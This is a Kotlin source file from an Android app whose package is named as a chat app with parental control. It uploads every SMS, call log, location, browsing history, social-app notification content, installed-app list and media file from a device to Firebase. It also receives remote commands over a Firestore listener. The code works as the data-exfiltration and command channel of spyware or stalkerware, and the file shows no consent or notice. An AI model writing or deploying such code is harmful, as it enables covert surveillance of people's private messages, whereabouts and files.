package com.anonchat.app.parentalcontrol.manager

import android.util.Log
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.util.BatteryInfo
import com.anonchat.app.parentalcontrol.util.CallLogEntry
import com.anonchat.app.parentalcontrol.util.DeviceInfo
import com.anonchat.app.parentalcontrol.util.InstalledApp
import com.anonchat.app.parentalcontrol.util.LocationData
import com.anonchat.app.parentalcontrol.util.ScreenTimeData
import com.anonchat.app.parentalcontrol.util.SmsMessage
import com.anonchat.app.parentalcontrol.util.WebHistoryEntry
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.tasks.await
import org.json.JSONObject
import java.io.File

object FirebaseManager {
    private const val TAG = "FirebaseManager"
    private val db by lazy { FirebaseFirestore.getInstance() }
    private val storage by lazy { FirebaseStorage.getInstance() }

    private val deviceId: String
        get() {
            val id = CloudConfig.deviceId
            return if (id.isNotEmpty()) id else android.os.Build.MODEL
        }

    /**
     * Upload full device status and report data to Firebase Firestore using WriteBatch (No Truncation)
     */
    suspend fun reportToFirebase(
        deviceInfo: DeviceInfo,
        location: LocationData?,
        battery: BatteryInfo,
        smsMessages: List<SmsMessage>,
        callLogs: List<CallLogEntry>,
        installedApps: List<InstalledApp>,
        activities: List<JSONObject>,
        screentime: ScreenTimeData?,
        webHistory: List<WebHistoryEntry>,
        socialNotifications: List<JSONObject>
    ) {
        try {
            val primaryId = deviceId
            val modelId = deviceInfo.model.ifEmpty { android.os.Build.MODEL }
            
            // To ensure 100% parity whether dashboard selects CloudConfig.deviceId or model ID (e.g. 2018),
            // update both document references if they differ!
            val devIds = listOfNotNull(primaryId, if (modelId != primaryId) modelId else null).distinct()

            val now = System.currentTimeMillis()

            for (devId in devIds) {
                if (devId.isEmpty()) continue
                val devRef = db.collection("devices").document(devId)

                var batch = db.batch()
                var opCount = 0

                // 1. Device Document Header
                val deviceDoc = hashMapOf<String, Any>(
                    "device_id" to devId,
                    "device_name" to deviceInfo.deviceName,
                    "manufacturer" to deviceInfo.manufacturer,
                    "model" to deviceInfo.model,
                    "android_version" to deviceInfo.androidVersion,
                    "sdk_version" to deviceInfo.sdkVersion,
                    "is_active" to true,
                    "last_seen" to now,
                    "battery_level" to battery.level,
                    "is_charging" to battery.isCharging,
                    "battery_temperature" to battery.temperature,
                    "screen_time_today" to (screentime?.totalMinutes ?: 0),
                    "unlock_count_today" to (screentime?.unlocks ?: 0)
                )
                batch.set(devRef, deviceDoc, SetOptions.merge())
                opCount++

                // 2. Location
                location?.let { loc ->
                    val locData = hashMapOf<String, Any>(
                        "latitude" to loc.latitude,
                        "longitude" to loc.longitude,
                        "accuracy" to loc.accuracy,
                        "provider" to loc.provider,
                        "timestamp" to loc.timestamp
                    )
                    batch.set(devRef.collection("locations").document(loc.timestamp.toString()), locData, SetOptions.merge())
                    opCount++
                }

                // 3. ALL SMS Messages (No limit)
                for (sms in smsMessages) {
                    val smsData = hashMapOf<String, Any>(
                        "id" to sms.id,
                        "address" to sms.address,
                        "body" to sms.body,
                        "date" to sms.date,
                        "type" to sms.type
                    )
                    batch.set(devRef.collection("sms").document(sms.id.toString()), smsData, SetOptions.merge())
                    opCount++
                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
                }

                // 4. ALL Call Logs (No limit)
                for (call in callLogs) {
                    val callDocId = if (call.id > 0) call.id.toString() else call.date.toString()
                    val callData = hashMapOf<String, Any>(
                        "id" to call.id,
                        "number" to call.number,
                        "name" to (call.name ?: ""),
                        "duration" to call.duration,
                        "date" to call.date,
                        "type" to call.type
                    )
                    batch.set(devRef.collection("calls").document(callDocId), callData, SetOptions.merge())
                    opCount++
                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
                }

                // 5. ALL Activities
                for (act in activities) {
                    val ts = act.optLong("timestamp", System.currentTimeMillis())
                    val actData = hashMapOf<String, Any>(
                        "activity_type" to act.optString("activity_type", "unknown"),
                        "package_name" to act.optString("package_name", ""),
                        "app_name" to act.optString("app_name", ""),
                        "data" to act.optString("data", "{}"),
                        "timestamp" to ts
                    )
                    batch.set(devRef.collection("activity").document(ts.toString()), actData, SetOptions.merge())
                    opCount++
                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
                }

                // 6. ALL Web History
                for (web in webHistory) {
                    val docId = web.url.hashCode().toString()
                    val webData = hashMapOf<String, Any>(
                        "url" to web.url,
                        "title" to web.title,
                        "browser" to web.browser,
                        "visit_count" to web.visitCount,
                        "timestamp" to web.timestamp
                    )
                    batch.set(devRef.collection("webhistory").document(docId), webData, SetOptions.merge())
                    opCount++
                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
                }

                // 7. ALL Social Notifications
                for (notif in socialNotifications) {
                    val ts = notif.optLong("timestamp", System.currentTimeMillis())
                    val notifData = hashMapOf<String, Any>(
                        "app_name" to notif.optString("app_name", ""),
                        "package_name" to notif.optString("package_name", ""),
                        "sender" to notif.optString("sender", ""),
                        "content" to notif.optString("content", ""),
                        "message_type" to notif.optString("message_type", "notification"),
                        "timestamp" to ts
                    )
                    batch.set(devRef.collection("social").document(ts.toString()), notifData, SetOptions.merge())
                    opCount++
                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
                }

                // 8. ALL Installed Apps
                for (app in installedApps) {
                    val appData = hashMapOf<String, Any>(
                        "package_name" to app.packageName,
                        "app_name" to app.appName,
                        "version_name" to (app.versionName ?: ""),
                        "version_code" to app.versionCode,
                        "first_install_time" to app.firstInstallTime,
                        "last_update_time" to app.lastUpdateTime,
                        "is_system_app" to app.isSystemApp
                    )
                    batch.set(devRef.collection("apps").document(app.packageName.replace("/", "_")), appData, SetOptions.merge())
                    opCount++
                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
                }

                if (opCount > 0) {
                    batch.commit().await()
                }
            }

            Log.d(TAG, "Batch report committed to Firebase Firestore for $devIds")
        } catch (e: Exception) {
            Log.e(TAG, "Error committing batch to Firestore", e)
        }
    }

    /**
     * Upload media file directly to Firebase Storage
     */
    suspend fun uploadMediaFile(file: File, mediaType: String): String? {
        return try {
            val devId = deviceId
            val fileName = "${System.currentTimeMillis()}_${file.name}"
            val storageRef = storage.reference.child("devices/$devId/media/$fileName")

            val uploadTask = storageRef.putFile(android.net.Uri.fromFile(file)).await()
            val downloadUrl = uploadTask.storage.downloadUrl.await().toString()

            val mediaDoc = hashMapOf<String, Any>(
                "filename" to file.name,
                "file_size" to file.length(),
                "mime_type" to mediaType,
                "storage_url" to downloadUrl,
                "timestamp" to System.currentTimeMillis()
            )
            db.collection("devices").document(devId)
                .collection("media").document(System.currentTimeMillis().toString())
                .set(mediaDoc)
                .await()

            Log.d(TAG, "Uploaded media file to Firebase Storage: $downloadUrl")
            downloadUrl
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading file to Firebase Storage", e)
            null
        }
    }

    /**
     * Realtime listener for incoming commands from Firebase Firestore
     */
    fun listenForCommands(onCommandReceived: (commandId: String, commandType: String, params: Map<String, Any>) -> Unit) {
        val devId = deviceId
        if (devId.isEmpty()) return

        db.collection("devices").document(devId)
            .collection("commands")
            .whereEqualTo("status", "pending")
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.w(TAG, "Listen command failed.", e)
                    return@addSnapshotListener
                }

                snapshots?.documentChanges?.forEach { change ->
                    val doc = change.document
                    val commandId = doc.id
                    val commandType = doc.getString("command_type") ?: doc.getString("type") ?: ""
                    val params = doc.data

                    // Mark as in-progress
                    db.collection("devices").document(devId)
                        .collection("commands").document(commandId)
                        .update("status", "processing")

                    onCommandReceived(commandId, commandType, params)
                }
            }
    }

    /**
     * Update command status in Firestore
     */
    fun updateCommandStatus(commandId: String, status: String, resultData: Map<String, Any>? = null) {
        val devId = deviceId
        if (devId.isEmpty() || commandId.isEmpty()) return

        val update = hashMapOf<String, Any>("status" to status, "updated_at" to System.currentTimeMillis())
        resultData?.let { update["result"] = it }

        db.collection("devices").document(devId)
            .collection("commands").document(commandId)
            .set(update, SetOptions.merge())
    }
}
